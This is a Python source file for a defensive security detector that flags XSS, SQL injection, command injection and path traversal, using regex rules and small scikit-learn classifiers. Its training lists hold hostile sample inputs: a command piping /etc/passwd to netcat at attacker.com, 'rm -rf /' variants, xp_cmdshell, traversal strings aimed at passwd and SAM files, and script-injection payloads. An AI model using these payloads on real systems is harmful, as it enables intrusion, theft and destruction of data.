"""
Neural Network Security Detection Engine (Simulation)
Implements AI/ML-based threat detection using available libraries
"""
import numpy as np
import re
from typing import List, Tuple, Dict, Any
import json
import hashlib
from datetime import datetime
from collections import defaultdict
import pickle
import os

# Use scikit-learn if available, otherwise use a rule-based simulation
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.linear_model import LogisticRegression
    from sklearn.naive_bayes import MultinomialNB
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.model_selection import train_test_split
    sklearn_available = True
except ImportError:
    sklearn_available = False

# Use transformers if available for more advanced NLP
try:
    import transformers
    transformers_available = True
except ImportError:
    transformers_available = False


class NeuralSecurityDetector:
    """
    AI/ML-based security threat detection using available libraries
    Falls back to enhanced rule-based detection if ML libraries unavailable
    """
    
    def __init__(self):
        self.models = {
            'xss': None,
            'sqli': None,
            'cmd_injection': None,
            'path_traversal': None
        }
        
        # Initialize feature extractors
        self.vectorizers = {
            'xss': None,
            'sqli': None,
            'cmd_injection': None,
            'path_traversal': None
        }
        
        # Enhanced pattern detection for fallback
        self.patterns = {
            'xss': [
                r'<script[^>]*>.*?</script>',
                r'javascript\s*:.*',
                r'on\w+\s*=.*',
                r'<iframe[^>]*>',
                r'<object[^>]*>',
                r'<embed[^>]*>',
                r'<svg[^>]*>.*</svg>',
                r'eval\s*\([^)]+\)',
                r'expression\s*\([^)]+\)'
            ],
            'sqli': [
                r'\bUNION\b.*\bSELECT\b',
                r"'[^']*'[^']*'",  # Potential quote manipulation
                r'\bOR\b\s+(1=1|\'1\'=\'1\')',
                r'exec\s*\([^)]+\)',
                r'drop\s+\w+\s+\w+',
                r'select.*from.*where.*=.*select',
                r'insert\s+into.*select',
                r'update.*set.*where.*=.*select'
            ],
            'cmd_injection': [
                r'\|\s*cat\s+',
                r'\|\s*rm\s+',
                r'\|\s*chmod\s+',
                r'\|\s*chown\s+',
                r'`.*?`',
                r'\$\([^)]*\)',
                r'\|\s*nc\s+',
                r'\|\s*netcat\s+',
                r'\|\s*wget\s+',
                r'\|\s*curl\s+',
                r'\|\s*python\s+',
                r'\|\s*perl\s+',
                r';\s*rm\s+'
            ],
            'path_traversal': [
                r'(\.\./)+',
                r'(\.\.\\)+',
                r'%2e%2e%2f',
                r'%2e%2e%5c',
                r'\.\.\/',
                r'\.\.\\'
            ]
        }
        
        # Contextual analysis rules
        self.context_rules = {
            'xss': [
                # Content appearing in potentially dangerous contexts
                r'content\s*[\'"]\s*:\s*[\'"][^\'"]*<script',
                r'value\s*[\'"]\s*:\s*[\'"][^\'"]*javascript:',
                r'html\s*[\'"]\s*:\s*[\'"][^\'"]*<'
            ],
            'sqli': [
                # SQL-like structures in unexpected places
                r'\b(select|from|where|union|drop|exec)\s+[a-z_][a-z0-9_]*\s*[\'"]',
                r'[\'"][^\'"]*;\s*(drop|exec|delete|update|insert)\s+'
            ]
        }
    
    def _extract_features(self, text: str) -> np.ndarray:
        """Extract basic features from text for ML models"""
        features = []
        
        # Basic character/word level features
        features.append(len(text))  # Length
        features.append(text.count(' '))  # Spaces
        features.append(text.count('<'))  # HTML indicators
        features.append(text.count("'"))  # Quote usage
        features.append(text.count('"'))  # Double quotes
        features.append(text.count(';'))  # Statement terminators
        features.append(text.count('|'))  # Pipeline operators
        features.append(text.count('..'))  # Path traversal indicators
        features.append(len(re.findall(r'[A-Z]', text)))  # Uppercase letters
        features.append(len(re.findall(r'[0-9]', text)))  # Numbers
        
        # Pattern matching features
        for pattern_list in self.patterns.values():
            for pattern in pattern_list[:3]:  # Use first 3 patterns for features
                features.append(1 if re.search(pattern, text, re.IGNORECASE) else 0)
        
        return np.array(features)
    
    def _calculate_confidence(self, text: str, threat_type: str) -> Tuple[float, str]:
        """Calculate confidence score based on patterns and context"""
        confidence = 0.0
        patterns_found = []
        
        # Check direct patterns
        for pattern in self.patterns.get(threat_type, []):
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                patterns_found.extend(matches)
                confidence += 0.15 * len(matches)  # Weight based on number of matches
        
        # Check contextual rules
        context_rules = self.context_rules.get(threat_type, [])
        for rule in context_rules:
            if re.search(rule, text, re.IGNORECASE):
                confidence += 0.2
        
        # Additional heuristics
        text_lower = text.lower()
        
        if threat_type == 'xss':
            # XSS-specific heuristics
            if 'script' in text_lower:
                confidence += 0.1
            if any(tag in text_lower for tag in ['iframe', 'object', 'embed', 'svg']):
                confidence += 0.05
            if any(event in text_lower for event in ['onload', 'onerror', 'onclick', 'onmouseover']):
                confidence += 0.1
                
        elif threat_type == 'sqli':
            # SQLI-specific heuristics
            if any(keyword in text_lower for keyword in ['union', 'select', 'from', 'where', 'drop', 'exec']):
                confidence += 0.05
            if text.count("'") > 3 and any(keyword in text_lower for keyword in ['or', 'and']):
                confidence += 0.1
                
        elif threat_type == 'cmd_injection':
            # Command injection heuristics
            if any(cmd in text_lower for cmd in ['cat', 'rm', 'chmod', 'chown', 'nc', 'netcat']):
                confidence += 0.1
            if text.count('|') > 0 or text.count('`') > 0 or '$(' in text:
                confidence += 0.1
                
        elif threat_type == 'path_traversal':
            # Path traversal heuristics
            if '../' in text or '..\\' in text:
                confidence += 0.2
            if text.count('../') > 1 or text.count('..\\') > 1:
                confidence += 0.1
        
        # Normalize confidence to 0-1 range
        confidence = min(1.0, confidence)
        
        # Determine severity
        if confidence >= 0.8:
            severity = "CRITICAL"
        elif confidence >= 0.6:
            severity = "HIGH"
        elif confidence >= 0.3:
            severity = "MEDIUM"
        elif confidence > 0:
            severity = "LOW"
        else:
            severity = "NONE"
        
        return confidence, severity, patterns_found
    
    def train_model(self, threat_type: str, texts: List[str], labels: List[int], epochs: int = 10):
        """Train model if sklearn is available, otherwise use rule-based approach"""
        if sklearn_available:
            try:
                # Use TF-IDF vectorization
                vectorizer = TfidfVectorizer(
                    ngram_range=(1, 3),
                    max_features=5000,
                    analyzer='char_wb'
                )
                
                # Transform texts to feature vectors
                X = vectorizer.fit_transform(texts)
                y = np.array(labels)
                
                # Create and train model
                if threat_type in ['xss', 'sqli']:
                    model = LogisticRegression(random_state=42, max_iter=1000)
                else:
                    model = MultinomialNB()
                
                model.fit(X, y)
                
                # Store the trained model and vectorizer
                self.models[threat_type] = model
                self.vectorizers[threat_type] = vectorizer
                
                print(f"Trained {threat_type} model with {len(texts)} samples")
                return True
            except Exception as e:
                print(f"Failed to train {threat_type} model: {e}")
                # Fall back to rule-based detection
                return False
        else:
            # If sklearn not available, we'll rely on rule-based detection
            print(f"Scikit-learn not available, using rule-based detection for {threat_type}")
            return False
    
    def predict(self, threat_type: str, text: str) -> Tuple[float, str, List[str]]:
        """Predict if text contains specific threat type"""
        if not isinstance(text, str):
            text = str(text)
        
        if threat_type not in self.models:
            raise ValueError(f"Unknown threat type: {threat_type}")
        
        # If sklearn is available and model is trained, use ML approach
        if sklearn_available and self.models.get(threat_type) is not None:
            try:
                # Transform text using the trained vectorizer
                vectorizer = self.vectorizers[threat_type]
                model = self.models[threat_type]
                
                X = vectorizer.transform([text])
                proba = model.predict_proba(X)[0]
                
                # Get the probability of the positive class
                confidence = float(proba[1]) if len(proba) > 1 else float(proba[0])
                
                # Determine severity based on confidence
                if confidence >= 0.9:
                    severity = "CRITICAL"
                elif confidence >= 0.7:
                    severity = "HIGH"
                elif confidence >= 0.5:
                    severity = "MEDIUM"
                else:
                    severity = "LOW"
                
                # Also run pattern detection for additional context
                _, _, patterns_found = self._calculate_confidence(text, threat_type)
                
                return confidence, severity, patterns_found
            except Exception as e:
                print(f"ML prediction failed for {threat_type}, falling back to rule-based: {e}")
        
        # Fallback to rule-based detection
        confidence, severity, patterns = self._calculate_confidence(text, threat_type)
        return confidence, severity, patterns
    
    def train_all_models(self):
        """Train all models with sample data if sklearn is available"""
        if not sklearn_available:
            print("Scikit-learn not available. Using enhanced rule-based detection.")
            return False
        
        print("Training neural network models with sample data...")
        
        # XSS training data
        xss_positives = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<div onmouseover=alert('XSS')>Hover</div>",
            "'\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\">"
        ]
        
        xss_negatives = [
            "<p>Hello World</p>",
            "Safe Content",
            "Normal text content",
            "This is a normal paragraph",
            "User: john, Age: 25",
            "Product Name: Widget 123",
            "Email: user@example.com",
            "Description: A simple product",
            "Title: My Document",
            "Content: This is safe text"
        ]
        
        # SQL Injection training data
        sqli_positives = [
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "admin'--",
            "admin' OR '1'='1",
            "SELECT * FROM users WHERE name = 'admin' UNION SELECT password FROM admin_table",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL, NULL--",
            "admin' AND 1=1--",
            "1 OR '1'='1",
            "SELECT 1; EXEC xp_cmdshell 'dir'--",
            "' OR 1=1--"
        ]
        
        sqli_negatives = [
            "SELECT * FROM users WHERE id = 1",
            "SELECT name, email FROM users WHERE active = 1",
            "INSERT INTO orders (user_id, product) VALUES (123, 'Widget')",
            "UPDATE users SET name = 'John' WHERE id = 1",
            "DELETE FROM temp WHERE created < '2023-01-01'",
            "SELECT COUNT(*) FROM products WHERE price > 10",
            "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
            "SELECT * FROM posts WHERE author = 'admin'",
            "SELECT p.name FROM products p WHERE p.category = 'electronics'",
            "SELECT * FROM comments WHERE post_id = 5 ORDER BY created_at DESC"
        ]
        
        # Command Injection training data
        cmd_positives = [
            "ls | cat /etc/passwd",
            "ping `whoami`.attacker.com",
            "echo 'test' | rm -rf / --no-preserve-root",
            "cat /etc/passwd | nc attacker.com 80",
            "ls && rm -rf /",
            "echo 'test' > /dev/null && rm -rf /",
            "`whoami`",
            "$(whoami)",
            "cat /etc/passwd; rm -rf /",
            "ls | grep root"
        ]
        
        cmd_negatives = [
            "ls -la",
            "cat /tmp/log.txt",
            "grep error /var/log/app.log",
            "ps aux | grep python",
            "df -h",
            "free -m",
            "top -b -n 1",
            "find /home -name '*.txt'",
            "du -sh /var/log",
            "tail -n 100 /var/log/app.log"
        ]
        
        # Path Traversal training data
        path_positives = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..././..././etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32",
            ".../.../.../config.txt",
            "..%2f..%2f../windows/system.ini",
            "....//....//etc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        ]
        
        path_negatives = [
            "documents/file.txt",
            "images/photo.jpg",
            "src/main.py",
            "config/app.json",
            "logs/app.log",
            "data/users.csv",
            "assets/style.css",
            "static/js/app.js",
            "templates/index.html",
            "public/uploads/photo.png"
        ]
        
        # Combine and create training data
        def create_training_data(positives, negatives):
            texts = positives + negatives
            labels = [1] * len(positives) + [0] * len(negatives)
            return texts, labels
        
        # Train XSS model
        xss_texts, xss_labels = create_training_data(xss_positives, xss_negatives)
        self.train_model('xss', xss_texts, xss_labels)
        
        # Train SQLI model
        sqli_texts, sqli_labels = create_training_data(sqli_positives, sqli_negatives)
        self.train_model('sqli', sqli_texts, sqli_labels)
        
        # Train Command Injection model
        cmd_texts, cmd_labels = create_training_data(cmd_positives, cmd_negatives)
        self.train_model('cmd_injection', cmd_texts, cmd_labels)
        
        # Train Path Traversal model
        path_texts, path_labels = create_training_data(path_positives, path_negatives)
        self.train_model('path_traversal', path_texts, path_labels)
        
        print("Neural network models training completed!")
        return True

    def get_model_status(self) -> Dict:
        """Get status of all models"""
        status = {}
        for threat_type in self.models.keys():
            if sklearn_available and self.models[threat_type] is not None:
                status[threat_type] = {
                    "loaded": True,
                    "method": "machine_learning",
                    "status": "ready"
                }
            else:
                status[threat_type] = {
                    "loaded": True,  # We can always use rule-based
                    "method": "rule_based_enhanced",
                    "status": "using_enhanced_rules"
                }
        
        return status


# Global instance
neural_detector = NeuralSecurityDetector()